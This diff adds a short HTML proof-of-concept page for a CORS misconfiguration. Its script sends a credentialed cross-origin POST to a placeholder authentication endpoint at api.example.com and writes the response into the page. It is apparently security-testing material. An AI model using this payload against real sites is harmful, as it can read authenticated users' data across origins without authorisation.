@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CORS POST PoC</title>
+</head>
+
+<body>
+  <h2>CORS Misconfiguration PoC (POST)</h2>
+  <p>Demonstrates cross-origin authenticated POST request</p>
+
+  <script>
+    var xhr = new XMLHttpRequest();
+
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === 4) {
+        document.body.innerHTML +=
+          "<pre>" + xhr.responseText + "</pre>";
+      }
+    };
+
+    xhr.open("POST", "https://api.example.com/api/auth", true);
+    xhr.withCredentials = true;
+    xhr.setRequestHeader("Content-Type", "application/json");
+
+    var data = JSON.stringify({
+      "test": "cors"
+    });
+
+    xhr.send(data);
+  </script>
+</body>
+</html>
